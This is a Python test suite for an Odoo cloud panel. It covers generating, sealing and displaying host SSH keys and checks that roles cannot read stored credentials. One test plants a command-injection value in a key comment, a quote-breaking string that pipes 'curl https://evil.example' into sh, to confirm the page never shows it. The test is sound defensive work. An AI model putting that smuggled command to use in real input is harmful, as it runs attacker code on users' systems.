"""The SSH key the panel generates for a host, and the public half it shows.

A new host can be given a key the panel makes instead of one the person
uploads: the private half is sealed until the host is created, then kept
in ``key_file`` exactly as an uploaded one. The host page shows the public
half of whatever key is stored, and never the private one.
"""

import base64
import tempfile
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import asyncssh
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from odoo import http
from odoo.api import call_kw
from odoo.exceptions import AccessError, UserError
from odoo.service.model import get_public_method
from odoo.tests.common import TransactionCase, new_test_user

from odoo.addons.incubacloud.models import cloud_host as cloud_host_module
from odoo.addons.incubacloud.models import encrypted_char, password_utils
from odoo.addons.incubacloud.models.password_utils import (
    IncubacloudCryptoError,
    encrypt_value,
)

from .test_ansible_executor import _PingExecutor
from .test_cloud_host import TestSaveHostCertificateRoute

#: The comment every public key the panel shows ends with.
COMMENT = "incubacloud"


def _uploaded_rsa_key():
    """Return an RSA key as a person would upload it, and its public half.

    RSA in the classic PEM envelope, so the derivation is shown to work for
    a key the panel did not make. The public half is the line the page
    shows: the key's type and data, and the panel's comment.

    :return: ``(key_file value, OpenSSH public key)``
    :rtype: tuple[str, str]
    """
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public = key.public_key().public_bytes(
        encoding=serialization.Encoding.OpenSSH,
        format=serialization.PublicFormat.OpenSSH,
    ).decode()
    return base64.b64encode(pem).decode(), f"{public} {COMMENT}"


def _key_file_of(key, passphrase=None):
    """Return *key* as ``key_file`` stores an uploaded one.

    :param asyncssh.SSHKey key: the private key
    :param str passphrase: the passphrase to protect it with, if any
    :rtype: str
    """
    pem = key.export_private_key("openssh", passphrase=passphrase)
    return base64.b64encode(pem).decode()


class TestHostGeneratedKey(TransactionCase):
    """``cloud.host``'s key generation, sealing and public-key derivation."""

    def setUp(self):
        super().setUp()
        self.Host = self.env["cloud.host"]

    def _host(self, **vals):
        """Create a host with the fields every host needs.

        :param vals: fields that override the defaults
        :rtype: cloud.host
        """
        return self.Host.create({
            "name": "genkey-host",
            "ip_address": "198.51.100.40",
            "user": "root",
            "wildcard_domain": "genkey.example.com",
        } | vals)

    def test_generated_key_is_ed25519_and_matches_its_public_half(self):
        pair = self.Host._generate_ssh_key()
        value = self.Host._unseal_ssh_key(pair["sealed_key"])
        key = asyncssh.import_private_key(base64.b64decode(value))
        self.assertEqual(key.algorithm, b"ssh-ed25519")
        self.assertEqual(
            key.export_public_key("openssh").decode().strip(),
            pair["public_key"],
        )
        self.assertTrue(pair["public_key"].startswith("ssh-ed25519 "))

    def test_sealed_key_hides_the_private_half(self):
        pair = self.Host._generate_ssh_key()
        value = self.Host._unseal_ssh_key(pair["sealed_key"])
        pem = base64.b64decode(value).decode()
        self.assertTrue(pair["sealed_key"].startswith("enc:"))
        self.assertNotIn(value, pair["sealed_key"])
        self.assertNotIn("PRIVATE KEY", pair["sealed_key"])
        self.assertNotIn(pem, repr(pair))

    def test_unseal_refuses_a_key_the_panel_did_not_seal(self):
        value, _public = _uploaded_rsa_key()
        for sealed in (value, "enc:not-a-token", ""):
            with self.subTest(sealed=sealed[:12]), self.assertRaises(UserError):
                self.Host._unseal_ssh_key(sealed)

    def test_stored_generated_key_connects_and_shows_its_public_half(self):
        pair = self.Host._generate_ssh_key()
        host = self._host(
            login_type="ssh_key",
            key_file=self.Host._unseal_ssh_key(pair["sealed_key"]),
            known_hosts_key="198.51.100.40 ssh-ed25519 "
            "AAAAC3NzaC1lZDI1NTE5AAAAIJaMpz0nufPywotPWDd25L+JfduErsyzERxWZQbpydiI",
        )
        self.assertEqual(host._ssh_public_key(), pair["public_key"])
        client_keys = host.ssh_connect_kwargs()["client_keys"]
        self.assertEqual(
            asyncssh.import_private_key(client_keys[0])
            .export_public_key("openssh").decode().strip(),
            pair["public_key"],
        )

    def test_public_half_of_an_uploaded_key(self):
        value, public = _uploaded_rsa_key()
        host = self._host(login_type="ssh_key", key_file=value)
        self.assertEqual(host._ssh_public_key(), public)

    def test_password_host_has_no_public_key(self):
        host = self._host(login_type="password", password="s3cret-pass")
        self.assertEqual(host._ssh_public_key(), "")

    def test_unreadable_key_has_no_public_key(self):
        host = self._host(
            login_type="ssh_key",
            key_file=base64.b64encode(b"not a key").decode(),
        )
        self.assertEqual(host._ssh_public_key(), "")

    def test_unseal_refuses_a_secret_sealed_for_something_else(self):
        """Another value this panel encrypted is not a generated key.

        A host's password or another host's ``key_file`` is sealed with the
        same secret key; only a value sealed as a generated key opens.
        """
        value, _public = _uploaded_rsa_key()
        others = {
            "password": encrypt_value("s3cret-pass", self.env),
            "key_file": encrypt_value(value, self.env),
        }
        for name, sealed in others.items():
            with self.subTest(name), self.assertRaises(UserError):
                self.Host._unseal_ssh_key(sealed)

    def test_unseal_refuses_a_key_sealed_too_long_ago(self):
        """A generated key opens for a day, not for ever."""
        key = asyncssh.generate_private_key("ssh-ed25519")
        plain = cloud_host_module.GENERATED_KEY_PURPOSE + _key_file_of(key)
        fernet = password_utils._get_fernet(self.env)
        then = int(time.time()) - cloud_host_module.GENERATED_KEY_TTL - 60
        sealed = "enc:" + fernet.encrypt_at_time(plain.encode(), then).decode()
        with self.assertRaises(UserError):
            self.Host._unseal_ssh_key(sealed)

    def test_public_half_carries_the_panel_s_comment_not_the_key_s(self):
        """The comment of an uploaded key never reaches the page.

        It goes into the command the page offers to copy and run, so a
        comment that closes the quotes would run whatever follows.
        """
        key = asyncssh.generate_private_key(
            "ssh-ed25519", comment="x' ; curl https://evil.example | sh ; echo '",
        )
        public = self._host(
            login_type="ssh_key", key_file=_key_file_of(key)
        )._ssh_public_key()
        kind, data, comment = public.split(" ")
        self.assertEqual((kind, comment), ("ssh-ed25519", COMMENT))
        self.assertEqual(
            f"{kind} {data}",
            " ".join(key.export_public_key("openssh").decode().split()[:2]),
        )
        self.assertNotIn("evil", public)

    def test_public_half_of_an_ecdsa_key(self):
        """A key of another type the panel connects with shows its half too."""
        key = asyncssh.generate_private_key("ecdsa-sha2-nistp256")
        public = self._host(
            login_type="ssh_key", key_file=_key_file_of(key)
        )._ssh_public_key()
        self.assertTrue(public.startswith("ecdsa-sha2-nistp256 "), public)
        self.assertTrue(public.endswith(f" {COMMENT}"), public)

    def test_key_with_a_passphrase_has_no_public_key(self):
        """The panel cannot open such a key, so it has nothing to show."""
        key = asyncssh.generate_private_key("ssh-ed25519")
        host = self._host(
            login_type="ssh_key", key_file=_key_file_of(key, passphrase="pw"),
        )
        self.assertEqual(host._ssh_public_key(), "")

    def test_corrupt_ciphertext_has_no_public_key(self):
        """A stored key that does not decrypt leaves the page empty, not broken."""
        key = asyncssh.generate_private_key("ssh-ed25519")
        host = self._host(login_type="ssh_key", key_file=_key_file_of(key))
        self.env.cr.execute(
            "UPDATE cloud_host SET key_file = %s WHERE id = %s",
            ("enc:gAAAAABnot-a-token", host.id),
        )
        host.invalidate_recordset(["key_file"])
        with patch.object(encrypted_char, "_alert_unreadable") as alert:
            self.assertEqual(host._ssh_public_key(), "")
        alert.assert_called_once()

    def test_panel_without_its_secret_key_has_no_public_key(self):
        """Without ``INCUBACLOUD_SECRET_KEY`` the page still opens."""
        key = asyncssh.generate_private_key("ssh-ed25519")
        host = self._host(login_type="ssh_key", key_file=_key_file_of(key))
        host.invalidate_recordset(["key_file"])
        with patch.object(password_utils, "_get_fernet", return_value=None):
            with self.assertRaises(IncubacloudCryptoError):
                host.key_file  # noqa: B018 — reading is what fails
            host.invalidate_recordset(["key_file"])
            with self.assertLogs(cloud_host_module.__name__, "WARNING"):
                self.assertEqual(host._ssh_public_key(), "")


class TestHostGeneratedKeyRoutes(TestSaveHostCertificateRoute):
    """The routes behind the new-host form and the host page.

    Reuses the parent's manager, host and ``_call``; the loader collects
    only the tests declared here.
    """

    def setUp(self):
        super().setUp()
        self.consultant = new_test_user(
            self.env,
            login="genkey_consultant",
            groups="base.group_user,incubacloud.group_cloud_consultant",
        )

    def _new_host_vals(self, **vals):
        """Return what the new-host form sends, with *vals* on top.

        :rtype: dict
        """
        return {
            "name": "genkey-route-host",
            "ip_address": "198.51.100.41",
            "user": "root",
            "wildcard_domain": "genkey-route.example.com",
            "login_type": "ssh_key",
        } | vals

    def _created(self, vals):
        """Create a host through ``/cloud/create_host`` and return it.

        :rtype: cloud.host
        """
        result = self._call("cloud_create_host", vals=vals)
        return self.env["cloud.host"].browse(result["id"])

    def test_generate_answers_the_public_half_and_a_sealed_private_one(self):
        pair = self._call("cloud_generate_host_key")
        self.assertEqual(set(pair), {"public_key", "sealed_key"})
        self.assertTrue(pair["public_key"].startswith("ssh-ed25519 "))
        self.assertNotIn("PRIVATE KEY", repr(pair))

    def test_generate_is_refused_below_manager(self):
        from odoo.addons.incubacloud.controllers import data_load
        from odoo.addons.incubacloud.controllers._data_load import (
            _routes_crud,
        )

        fake_request = MagicMock(spec=http.Request)
        fake_request.env = self.env(user=self.consultant)
        ctrl = data_load.CloudDataLoadController()
        with (
            patch.object(http, "request", fake_request),
            patch.object(data_load, "request", fake_request),
            patch.object(_routes_crud, "request", fake_request),
            self.assertRaises(AccessError),
        ):
            ctrl.cloud_generate_host_key()

    def test_create_with_the_generated_key_stores_it_as_an_upload(self):
        pair = self._call("cloud_generate_host_key")
        host = self._created(self._new_host_vals(generated_key=pair["sealed_key"]))
        key = asyncssh.import_private_key(host._get_ssh_private_key_bytes())
        self.assertEqual(key.algorithm, b"ssh-ed25519")
        self.assertEqual(
            key.export_public_key("openssh").decode().strip(),
            pair["public_key"],
        )

    def test_host_page_shows_the_public_half_and_never_the_private(self):
        pair = self._call("cloud_generate_host_key")
        host = self._created(self._new_host_vals(generated_key=pair["sealed_key"]))
        data = self._call("cloud_get_host", host_id=host.id)
        self.assertEqual(data["ssh_public_key"], pair["public_key"])
        self.assertTrue(data["has_key_file"])
        self.assertNotIn("key_file", data)
        self.assertNotIn(host.key_file, repr(data))
        self.assertNotIn("PRIVATE KEY", repr(data))

    def test_uploading_an_own_key_still_works(self):
        value, public = _uploaded_rsa_key()
        host = self._created(self._new_host_vals(key_file=value))
        self.assertEqual(host.key_file, value)
        data = self._call("cloud_get_host", host_id=host.id)
        self.assertEqual(data["ssh_public_key"], public)

    def test_password_host_generates_nothing(self):
        pair = self._call("cloud_generate_host_key")
        host = self._created(self._new_host_vals(
            login_type="password",
            password="s3cret-pass",
            generated_key=pair["sealed_key"],
        ))
        self.assertFalse(host.key_file)
        data = self._call("cloud_get_host", host_id=host.id)
        self.assertEqual(data["ssh_public_key"], "")

    def test_a_role_without_permission_cannot_read_the_key(self):
        pair = self._call("cloud_generate_host_key")
        host = self._created(self._new_host_vals(generated_key=pair["sealed_key"]))
        with self.assertRaises(AccessError):
            host.with_user(self.consultant).read(["key_file"])
        # What a client lists before reading: the field is not offered.
        self.assertNotIn(
            "key_file", host.with_user(self.consultant).fields_get(),
        )


class TestHostCredentialsStayInThePanel(TestSaveHostCertificateRoute):
    """No role of the panel reads a host's SSH credentials, and all connect.

    ``key_file`` and ``password`` are readable by system administrators
    only: a Manager or a Developer reaches the panel's generic ORM
    endpoints (``/web/dataset/call_kw``, export) and must not get them
    there. The panel's own code reads them elevated, so the connections,
    the host page and the jobs a Developer queues keep working.
    """

    def setUp(self):
        super().setUp()
        self.developer = new_test_user(
            self.env,
            login="genkey_developer",
            groups="base.group_user,incubacloud.group_cloud_developer",
        )
        self.key = asyncssh.generate_private_key("ssh-ed25519")
        self.pem = self.key.export_private_key("openssh")
        self.key_host = self.env["cloud.host"].create({
            "name": "creds-key-host",
            "ip_address": "198.51.100.42",
            "user": "root",
            "wildcard_domain": "creds-key.example.com",
            "login_type": "ssh_key",
            "key_file": base64.b64encode(self.pem).decode(),
            "known_hosts_key": "198.51.100.42 ssh-ed25519 "
            "AAAAC3NzaC1lZDI1NTE5AAAAIJaMpz0nufPywotPWDd25L+JfduErsyzERxWZQbpydiI",
        })
        self.password_host = self.env["cloud.host"].create({
            "name": "creds-password-host",
            "ip_address": "198.51.100.43",
            "user": "root",
            "wildcard_domain": "creds-password.example.com",
            "login_type": "password",
            "password": "s3cret-pass",
            "known_hosts_key": "198.51.100.43 ssh-ed25519 "
            "AAAAC3NzaC1lZDI1NTE5AAAAIJaMpz0nufPywotPWDd25L+JfduErsyzERxWZQbpydiI",
        })

    def test_no_role_reads_the_credentials(self):
        """Not by ``read``, ``search_read``, ``call_kw``, export or search."""
        hosts = (self.key_host | self.password_host).ids
        # Allowed to export, as an administrator may make them.
        (self.manager | self.developer).write({
            "groups_id": [(4, self.env.ref("base.group_allow_export").id)],
        })
        for user in (self.manager, self.developer):
            Host = self.env["cloud.host"].with_user(user)
            for field in ("key_file", "password"):
                with self.subTest(user=user.login, field=field):
                    with self.assertRaises(AccessError):
                        Host.browse(hosts).read([field])
                    with self.assertRaises(AccessError):
                        Host.search_read([("id", "in", hosts)], [field])
                    with self.assertRaises(AccessError):
                        call_kw(Host, "read", [hosts, [field]], {})
                    with self.assertRaises(AccessError):
                        call_kw(
                            Host, "search_read", [],
                            {"domain": [("id", "in", hosts)], "fields": [field]},
                        )
                    with self.assertRaises(AccessError):
                        Host.browse(hosts).export_data([field])
                    with self.assertRaises(AccessError):
                        Host.search([(field, "!=", False)])
                    self.assertNotIn(field, Host.fields_get())

    def test_the_connection_kwargs_are_not_callable_over_rpc(self):
        """They carry the credentials, read elevated for the panel's code.

        Odoo 18's ``call_kw`` leaves the check to its callers: execute_kw
        and /web/dataset/call_kw both ask ``get_public_method`` first.
        """
        Host = self.env["cloud.host"].with_user(self.manager)
        with self.assertRaises(AccessError):
            get_public_method(Host, "ssh_connect_kwargs")

    def test_the_roles_still_connect(self):
        """The panel's code reads the credentials for the user it runs as."""
        for user in (self.manager, self.developer):
            with self.subTest(user=user.login):
                key_host = self.key_host.with_user(user)
                self.assertEqual(key_host._get_ssh_private_key_bytes(), self.pem)
                self.assertEqual(
                    key_host.ssh_connect_kwargs()["client_keys"], [self.pem],
                )
                password_kwargs = self.password_host.with_user(
                    user,
                ).ssh_connect_kwargs()
                self.assertEqual(password_kwargs["password"], "s3cret-pass")
                self.assertIsNone(password_kwargs["client_keys"])
        self.assertTrue(
            self.key_host.with_user(self.developer)._ssh_public_key().startswith(
                "ssh-ed25519 ",
            ),
        )

    def test_a_developer_s_ansible_run_gets_the_key(self):
        """Ansible's key file is written from the key, read elevated."""
        executor = object.__new__(_PingExecutor)
        executor.job = MagicMock(spec=type(self.env["cloud.job"]))
        executor.job.id = 11
        executor.env = self.env(user=self.developer)
        executor._host_record = self.key_host.with_user(self.developer)
        executor._log_buffer = []
        executor._cancel_requested = False
        with tempfile.TemporaryDirectory(prefix="ic-genkey-") as root:
            executor._build_private_data_dir(root)
            written = Path(root, "ssh_key").read_text()
        self.assertEqual(written.strip(), self.pem.decode().strip())

    def test_the_host_page_says_which_credential_is_stored(self):
        """A Manager's host page tells a key host from a password host."""
        key_page = self._call("cloud_get_host", host_id=self.key_host.id)
        self.assertEqual(
            (key_page["has_key_file"], key_page["has_password"]), (True, True),
        )
        password_page = self._call("cloud_get_host", host_id=self.password_host.id)
        self.assertEqual(
            (password_page["has_key_file"], password_page["has_password"]),
            (False, True),
        )

    def test_a_manager_saves_a_new_key_and_reveals_the_password(self):
        """Writing a credential and the page's reveal button still work."""
        other = _key_file_of(asyncssh.generate_private_key("ssh-ed25519"))
        self._call("cloud_save_host", host_id=self.key_host.id, vals={
            "key_file": other,
        })
        self.assertEqual(self.key_host.key_file, other)
        answer = self._call(
            "cloud_get_secret",
            model="cloud.host", record_id=self.password_host.id, field="password",
        )
        self.assertEqual(answer, {"value": "s3cret-pass"})
